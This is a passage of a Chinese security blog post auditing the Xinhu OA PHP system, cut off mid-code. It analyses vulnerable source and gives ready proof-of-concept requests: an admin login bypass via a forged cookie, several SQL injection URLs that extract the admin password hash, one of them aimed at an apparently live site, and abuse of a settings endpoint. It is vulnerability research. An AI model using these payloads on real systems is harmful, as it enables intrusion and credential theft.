<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="信呼OA闲着没事，java学累了来整理下以前审的一个觉得很有意思的cms，这个作者写的比较灵活，同时灵活也代表着凌乱，很多不严谨导致的很多问题，也许也是oa系统相对于一些其他类型的站点要复杂，前期架构没设计好就很容易造成诸多不便还有些问题。这个cms我觉得最有意思的就是webmainAction.php当中的一些public开头的公共方法比如publicsavevalue这样，基本都是做三件事第一">
<meta property="og:type" content="article">
<meta property="og:title" content="某oa系统的审计">
<meta property="og:url" content="http://blog.leej.me/2018/03/07/某oa系统的审计/index.html">
<meta property="og:site_name" content="Leej">
<meta property="og:description" content="信呼OA闲着没事，java学累了来整理下以前审的一个觉得很有意思的cms，这个作者写的比较灵活，同时灵活也代表着凌乱，很多不严谨导致的很多问题，也许也是oa系统相对于一些其他类型的站点要复杂，前期架构没设计好就很容易造成诸多不便还有些问题。这个cms我觉得最有意思的就是webmainAction.php当中的一些public开头的公共方法比如publicsavevalue这样，基本都是做三件事第一">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/7e2785d1ly1fnxl850canj20yi0ly0up.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/7e2785d1ly1fnxl9qw0c5j20xb0e175y.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/7e2785d1ly1fnxlau8z9mj20ys0n0tc9.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/7e2785d1ly1fnxkdokgvsj20l50e175r.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/7e2785d1ly1fow94ygkmkj212c0b43zl.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/7e2785d1ly1fow96g1a45j21060bsgmn.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/7e2785d1ly1fow972gm1rj20l10nidh8.jpg">
<meta property="og:updated_time" content="2018-03-13T03:50:36.058Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="某oa系统的审计">
<meta name="twitter:description" content="信呼OA闲着没事，java学累了来整理下以前审的一个觉得很有意思的cms，这个作者写的比较灵活，同时灵活也代表着凌乱，很多不严谨导致的很多问题，也许也是oa系统相对于一些其他类型的站点要复杂，前期架构没设计好就很容易造成诸多不便还有些问题。这个cms我觉得最有意思的就是webmainAction.php当中的一些public开头的公共方法比如publicsavevalue这样，基本都是做三件事第一">
<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/7e2785d1ly1fnxl850canj20yi0ly0up.jpg">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>某oa系统的审计</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- rss -->
    
    
</head>

<body>
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://github.com/leejgod">Projects</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2018/03/13/某cms审计思路，以及ci框架如何找寻注入点/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2018/02/11/linux下使用gdb对php源码调试/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.leej.me/2018/03/07/某oa系统的审计/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://blog.leej.me/2018/03/07/某oa系统的审计/&text=某oa系统的审计"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.leej.me/2018/03/07/某oa系统的审计/&title=某oa系统的审计"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.leej.me/2018/03/07/某oa系统的审计/&is_video=false&description=某oa系统的审计"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=某oa系统的审计&body=Check out this article: http://blog.leej.me/2018/03/07/某oa系统的审计/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.leej.me/2018/03/07/某oa系统的审计/&title=某oa系统的审计"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.leej.me/2018/03/07/某oa系统的审计/&title=某oa系统的审计"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.leej.me/2018/03/07/某oa系统的审计/&title=某oa系统的审计"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://blog.leej.me/2018/03/07/某oa系统的审计/&title=某oa系统的审计"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.leej.me/2018/03/07/某oa系统的审计/&name=某oa系统的审计&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#信呼OA"><span class="toc-number">1.</span> <span class="toc-text">信呼OA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-管理员登录验证绕过，可直接登录任意在线用户"><span class="toc-number">1.0.1.</span> <span class="toc-text">1.管理员登录验证绕过，可直接登录任意在线用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-前台登录接口注入"><span class="toc-number">1.0.2.</span> <span class="toc-text">2.前台登录接口注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-自定义setval"><span class="toc-number">1.0.3.</span> <span class="toc-text">7.自定义setval</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-输出显示val"><span class="toc-number">1.0.4.</span> <span class="toc-text">8.输出显示val</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-输出显示val"><span class="toc-number">1.0.5.</span> <span class="toc-text">9.输出显示val</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#写文件GETSHELL"><span class="toc-number">1.0.6.</span> <span class="toc-text">写文件GETSHELL</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index width mx-auto px2 my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        某oa系统的审计
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Leej</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-03-07T09:18:16.000Z" itemprop="datePublished">2018-03-07</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="信呼OA"><a href="#信呼OA" class="headerlink" title="信呼OA"></a>信呼OA</h1><p>闲着没事，java学累了来整理下以前审的一个觉得很有意思的cms，这个作者写的比较灵活，同时灵活也代表着凌乱，很多不严谨导致的很多问题，也许也是oa系统相对于一些其他类型的站点要复杂，前期架构没设计好就很容易造成诸多不便还有些问题。这个cms我觉得最有意思的就是webmainAction.php当中的一些public开头的公共方法比如publicsavevalue这样，基本都是做三件事第一有个beforexxx还有个xxx还有afterxxx会去做一些有关的事，最重要的是这些方法都是可控的，不好表述具体仔细看代码会明白，总之感觉这是一个非常灵活的cms，同时又有颇多的问题，这里逻辑层面还做的比较繁杂，仔细推敲一定还能找着不少有关逻辑层面的洞，这里简单发几个。</p>
<h3 id="1-管理员登录验证绕过，可直接登录任意在线用户"><a href="#1-管理员登录验证绕过，可直接登录任意在线用户" class="headerlink" title="1.管理员登录验证绕过，可直接登录任意在线用户"></a>1.管理员登录验证绕过，可直接登录任意在线用户</h3><p>在\xinhu\webmain\task\mode\modeAction.php控制器中的initAction方法，可以看到接收用户传递的adminid还有token，之后将其带入login模型的autologin方法，该方法作用是实现快速登录，具体看一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">autologin</span><span class="params">($aid=<span class="number">0</span>, $token=<span class="string">''</span>, $ism=<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$baid  = <span class="keyword">$this</span>-&gt;adminid;</span><br><span class="line">		<span class="keyword">if</span>($aid&gt;<span class="number">0</span> &amp;&amp; $token!=<span class="string">''</span>)&#123;</span><br><span class="line">			$rs = <span class="keyword">$this</span>-&gt;getone(<span class="string">"`uid`='$aid' and `token`='$token' and `online`=1"</span>,<span class="string">'`name`'</span>);</span><br><span class="line">			<span class="keyword">if</span>(!$rs)<span class="keyword">exit</span>(<span class="string">'illegal request2'</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;setsession($aid, $rs[<span class="string">'name'</span>], $token);</span><br><span class="line">			$baid	= $aid;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>($baid==<span class="number">0</span>)&#123;</span><br><span class="line">			$uid 	= (int)<span class="keyword">$this</span>-&gt;rock-&gt;cookie(<span class="string">'mo_adminid'</span>,<span class="string">'0'</span>);<span class="comment">//用cookie登录</span></span><br><span class="line">			$onrs 	= <span class="keyword">$this</span>-&gt;getone(<span class="string">"`uid`=$uid and `online`=1"</span>,<span class="string">'`name`,`token`,`id`,`uid`'</span>);</span><br><span class="line">			<span class="keyword">if</span>($onrs)&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;setsession($uid, $onrs[<span class="string">'name'</span>], $onrs[<span class="string">'token'</span>]);</span><br><span class="line">				<span class="keyword">$this</span>-&gt;update(<span class="string">"moddt='"</span>.<span class="keyword">$this</span>-&gt;rock-&gt;now.<span class="string">"'"</span>, $onrs[<span class="string">'id'</span>]);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				$uid = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			$baid = $uid;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $baid;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到这里$this-&gt;adminid值的获取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">initRock</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;jm 		= c(<span class="string">'jm'</span>, <span class="keyword">true</span>);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;adminid	= (int)<span class="keyword">$this</span>-&gt;session(<span class="string">'adminid'</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;adminname= <span class="keyword">$this</span>-&gt;session(<span class="string">'adminname'</span>);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;adminuser= <span class="keyword">$this</span>-&gt;session(<span class="string">'adminuser'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到默认值为0</p>
<p>这里进入第二个if，发现这里仅仅验证cookie，得到一个uid，带入数据库查询这个uid，uid存在并且用户在线状态为1就进入<code>if($onrs)</code> 当中，同时设置session，并且成功登录。</p>
<p>利用方式（官网demo）：?m=mode&amp;d=task&amp;a=init&amp;adminid=0&amp;token=11</p>
<p>首先设置Cookie: xinhu_mo_adminid=1;然后访问该控制器</p>
<p><img src="http://ww1.sinaimg.cn/large/7e2785d1ly1fnxl850canj20yi0ly0up.jpg" alt=""> </p>
<p><img src="http://ww1.sinaimg.cn/large/7e2785d1ly1fnxl9qw0c5j20xb0e175y.jpg" alt="">  </p>
<p>访问前台：成功登录！</p>
<p><img src="http://ww1.sinaimg.cn/large/7e2785d1ly1fnxlau8z9mj20ys0n0tc9.jpg" alt="">  </p>
<h3 id="2-前台登录接口注入"><a href="#2-前台登录接口注入" class="headerlink" title="2.前台登录接口注入"></a>2.前台登录接口注入</h3><p>登陆接口处存在注入，无需登录，可获取管理员hash、token等重要凭据</p>
<p>首先\webmain\task\api\loginAction.php控制器当中的checkAction方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAction</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$adminuser	= str_replace(<span class="string">' '</span>,<span class="string">''</span>,<span class="keyword">$this</span>-&gt;rock-&gt;jm-&gt;base64decode(<span class="keyword">$this</span>-&gt;post(<span class="string">'user'</span>)));</span><br><span class="line">		$adminpass	= <span class="keyword">$this</span>-&gt;rock-&gt;jm-&gt;base64decode(<span class="keyword">$this</span>-&gt;post(<span class="string">'pass'</span>));</span><br><span class="line">		$arr 		= m(<span class="string">'login'</span>)-&gt;start($adminuser, $adminpass);</span><br><span class="line">		<span class="keyword">if</span>(is_array($arr))&#123;</span><br><span class="line">			$arrs = <span class="keyword">array</span>(</span><br><span class="line">				<span class="string">'uid'</span> 	=&gt; $arr[<span class="string">'uid'</span>],</span><br><span class="line">				<span class="string">'name'</span> 	=&gt; $arr[<span class="string">'name'</span>],</span><br><span class="line">				<span class="string">'user'</span>	=&gt; $arr[<span class="string">'user'</span>],</span><br><span class="line">				<span class="string">'ranking'</span>	=&gt; $arr[<span class="string">'ranking'</span>],</span><br><span class="line">				<span class="string">'deptname'</span>  =&gt; $arr[<span class="string">'deptname'</span>],</span><br><span class="line">				<span class="string">'deptallname'</span> =&gt; $arr[<span class="string">'deptallname'</span>],</span><br><span class="line">				<span class="string">'face'</span>  	=&gt; $arr[<span class="string">'face'</span>],</span><br><span class="line">				<span class="string">'apptx'</span>  	=&gt; $arr[<span class="string">'apptx'</span>],</span><br><span class="line">				<span class="string">'token'</span>  	=&gt; $arr[<span class="string">'token'</span>],</span><br><span class="line">				<span class="string">'iskq'</span>  	=&gt; (int)m(<span class="string">'userinfo'</span>)-&gt;getmou(<span class="string">'iskq'</span>, $arr[<span class="string">'uid'</span>]), <span class="comment">//判断是否需要考勤</span></span><br><span class="line">				<span class="string">'title'</span>		=&gt; getconfig(<span class="string">'apptitle'</span>),</span><br><span class="line">				<span class="string">'weblogo'</span>	=&gt; getconfig(<span class="string">'weblogo'</span>)</span><br><span class="line">			);</span><br><span class="line">			</span><br><span class="line">			$uid 	= $arr[<span class="string">'uid'</span>];</span><br><span class="line">			$name 	= $arr[<span class="string">'name'</span>];</span><br><span class="line">			$user 	= $arr[<span class="string">'user'</span>];</span><br><span class="line">			$token 	= $arr[<span class="string">'token'</span>];</span><br><span class="line">			m(<span class="string">'login'</span>)-&gt;setsession($uid, $name, $token, $user);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;showreturn($arrs);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;showreturn(<span class="string">''</span>, $arr, <span class="number">201</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>是做一个登录验证的api，其中调用的start()模型是一个具体的的登录验证，其中接受5个用户可控的参数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span><span class="params">($user, $pass, $cfrom=<span class="string">''</span>, $devices=<span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$uid   = <span class="number">0</span>; </span><br><span class="line">		$cfrom = <span class="keyword">$this</span>-&gt;rock-&gt;request(<span class="string">'cfrom'</span>, $cfrom);</span><br><span class="line">		$token = <span class="keyword">$this</span>-&gt;rock-&gt;request(<span class="string">'token'</span>);</span><br><span class="line">		$device= <span class="keyword">$this</span>-&gt;rock-&gt;request(<span class="string">'device'</span>, $devices);</span><br><span class="line">		$ip	   = <span class="keyword">$this</span>-&gt;rock-&gt;request(<span class="string">'ip'</span>, <span class="keyword">$this</span>-&gt;rock-&gt;ip);</span><br><span class="line">		$web   = <span class="keyword">$this</span>-&gt;rock-&gt;request(<span class="string">'web'</span>, <span class="keyword">$this</span>-&gt;rock-&gt;web);</span><br></pre></td></tr></table></figure>
<p>中间登录过程不详细解释，其中会有一个日志记录的动作，在start方法中看到末尾</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">m(<span class="string">'log'</span>)-&gt;addlog(<span class="string">''</span>.$cfrom.<span class="string">'登录'</span>, <span class="string">'['</span>.$posts.<span class="string">']'</span>.$loginx.<span class="string">''</span>.$logins.<span class="string">''</span>, <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">'optid'</span>		=&gt; $uid, </span><br><span class="line">	<span class="string">'optname'</span>	=&gt; $name,</span><br><span class="line">	<span class="string">'ip'</span>		=&gt; $ip,</span><br><span class="line">	<span class="string">'web'</span>		=&gt; $web,</span><br><span class="line">	<span class="string">'device'</span>	=&gt; $device</span><br><span class="line">));</span><br></pre></td></tr></table></figure>
<p>这一步将用户输入写入日志，其中过滤了单引号还有一些特殊的关键字，这里可以绕过，具体payload如下：</p>
<p><a href="http://localhost/xinhu/api.php?m=login&amp;a=check&amp;cfrom=pc&amp;user=hello&amp;pass=123&amp;ip=testip\&amp;web==(substr((seleselect*ct+pass+from+xinhu_admin+where+id+=1),1,1)=&quot;e&quot;%26%26sleep(5))--+&amp;device=testdevice" target="_blank" rel="noopener">http://localhost/xinhu/api.php?m=login&amp;a=check&amp;cfrom=pc&amp;user=hello&amp;pass=123&amp;ip=testip\&amp;web==(substr((seleselect*ct+pass+from+xinhu_admin+where+id+=1),1,1)=&quot;e&quot;%26%26sleep(5))--+&amp;device=testdevice</a></p>
<p><img src="http://ww1.sinaimg.cn/large/7e2785d1ly1fnxkdokgvsj20l50e175r.jpg" alt="">  </p>
<p>查询密码第一位如果为e则延时5秒</p>
<p>类似这样的注入应该还有一大把，懒得看，他<code>\</code> 没有过滤，稍微有点心应该都晓得怎么利用</p>
<p>###3.where处注入</p>
<p>没什么可分析的。poc</p>
<p><code>http://localhost/xinhu/?d=reim&amp;m=chat&amp;uid=1 or 1&amp;type=group&amp;winobj=group_14</code></p>
<p>#####4.where处注入</p>
<p><code>http://localhost/xinhu/?&amp;m=kaoqinj&amp;a=kqjcmddel&amp;d=main&amp;ajaxbool=true</code></p>
<p>post:<code>id=1) and sleep(4</code> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">kqjcmddelAjax</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id 	= <span class="keyword">$this</span>-&gt;post(<span class="string">'id'</span>);</span><br><span class="line">	m(<span class="string">'kqjcmd'</span>)-&gt;delete(<span class="string">"`id` in ($id)"</span>);</span><br><span class="line">	showreturn();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>###5.注入</p>
<p><code>http://localhost/xinhu/api.php?a=subscribe&amp;m=asynrun&amp;id=1 and sleep(10) &amp;uid&amp;receid&amp;recename&amp;asynkey=2b557b98f1dc3911727681ec3f38f78c</code></p>
<p>###6.注入</p>
<p><code>http://www.mianfeix.com/api.php?&amp;m=indexreim&amp;a=ldata</code> </p>
<p>post:<code>loaddt=MScgYW5kIDAgdW5pb24gc2VsZWN0IGlkLHVzZXIsMSwxLDEsbnVsbCxwYXNzLDEsMSBmcm9tIHhpbmh1X2FkbWluIw==sleep&amp;type=history</code> </p>
<h3 id="7-自定义setval"><a href="#7-自定义setval" class="headerlink" title="7.自定义setval"></a>7.自定义setval</h3><p>C:\phpStudy\PHPTutorial\WWW\xinhu\webmain\system\email\emailAction.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setsaveAjax</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;option-&gt;setval(<span class="string">'email_sendhost@-1'</span>, <span class="keyword">$this</span>-&gt;post(<span class="string">'sendhost'</span>));</span><br><span class="line">	<span class="keyword">$this</span>-&gt;option-&gt;setval(<span class="string">'email_sendport@-1'</span>, <span class="keyword">$this</span>-&gt;post(<span class="string">'sendport'</span>));</span><br><span class="line">	<span class="keyword">$this</span>-&gt;option-&gt;setval(<span class="string">'email_recehost@-1'</span>, <span class="keyword">$this</span>-&gt;post(<span class="string">'recehost'</span>));</span><br><span class="line">	<span class="keyword">$this</span>-&gt;option-&gt;setval(<span class="string">'email_sendsecure@-1'</span>, <span class="keyword">$this</span>-&gt;post(<span class="string">'sendsecure'</span>));</span><br><span class="line">	<span class="keyword">$this</span>-&gt;option-&gt;setval(<span class="string">'email_sysname@-1'</span>, <span class="keyword">$this</span>-&gt;post(<span class="string">'sysname'</span>));</span><br><span class="line">	<span class="keyword">$this</span>-&gt;option-&gt;setval(<span class="string">'email_sysuser@-1'</span>, <span class="keyword">$this</span>-&gt;post(<span class="string">'sysuser'</span>));</span><br><span class="line">	<span class="keyword">$this</span>-&gt;option-&gt;setval(<span class="string">'email_receyumi@-1'</span>, <span class="keyword">$this</span>-&gt;post(<span class="string">'receyumi'</span>));</span><br><span class="line">	$syspass	= <span class="keyword">$this</span>-&gt;post(<span class="string">'syspass'</span>);</span><br><span class="line">	<span class="keyword">if</span>(!isempt($syspass))&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;option-&gt;setval(<span class="string">'email_syspass@-1'</span>, <span class="keyword">$this</span>-&gt;jm-&gt;encrypt($syspass));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;backmsg();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另一个自定义val，比上面那个方便</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">savecolunmsAjax</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   $num   = <span class="keyword">$this</span>-&gt;post(<span class="string">'num'</span>);</span><br><span class="line">   $modeid = (int)<span class="keyword">$this</span>-&gt;post(<span class="string">'modeid'</span>);</span><br><span class="line">   $str   = <span class="keyword">$this</span>-&gt;post(<span class="string">'str'</span>);</span><br><span class="line">   <span class="keyword">$this</span>-&gt;option-&gt;setval($num.<span class="string">'@'</span>.(<span class="number">-1</span>*$modeid<span class="number">-1000</span>), $str,<span class="string">'模块列定义'</span>);</span><br><span class="line">   $path  = m(<span class="string">'mode'</span>)-&gt;createlistpage($modeid);</span><br><span class="line">   $msg   = <span class="string">'ok'</span>;</span><br><span class="line">   <span class="keyword">if</span>($path==<span class="string">''</span>)$msg=<span class="string">'已保存,但无法从新生成列表页,自定义列将不能生效'</span>;</span><br><span class="line">   <span class="keyword">echo</span> $msg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://localhost/xinhu/index.php?&amp;m=flow&amp;a=savecolunms&amp;ajaxbool=true&amp;d=main" target="_blank" rel="noopener">http://localhost/xinhu/index.php?&amp;m=flow&amp;a=savecolunms&amp;ajaxbool=true&amp;d=main</a></p>
<p>post:num=path&amp;str=/test/a</p>
<p>这不算漏洞，但是可以利用这个做一些事情。</p>
<h3 id="8-输出显示val"><a href="#8-输出显示val" class="headerlink" title="8.输出显示val"></a>8.输出显示val</h3><p>C:\phpStudy\PHPTutorial\WWW\xinhu\webmain\task\api\loginAction.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkewmAction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$randkey 		= <span class="keyword">$this</span>-&gt;get(<span class="string">'randkey'</span>);</span><br><span class="line"></span><br><span class="line">	$val 	 		= <span class="keyword">$this</span>-&gt;option-&gt;getval($randkey);</span><br><span class="line">	<span class="keyword">echo</span> $val;</span><br><span class="line">       <span class="comment">//echo $val;exit();</span></span><br><span class="line">	<span class="comment">//echo $val;</span></span><br><span class="line">	$data[<span class="string">'val'</span>] 	= $val;</span><br><span class="line">	<span class="comment">//echo $randkey;exit();</span></span><br><span class="line">	<span class="keyword">if</span>(isempt($randkey))<span class="keyword">$this</span>-&gt;showreturn($data);</span><br><span class="line">	<span class="keyword">if</span>($val&gt;<span class="string">'0'</span>)&#123;</span><br><span class="line">		$dbs 		= m(<span class="string">'admin'</span>);</span><br><span class="line">		$urs 		= $dbs-&gt;getone(<span 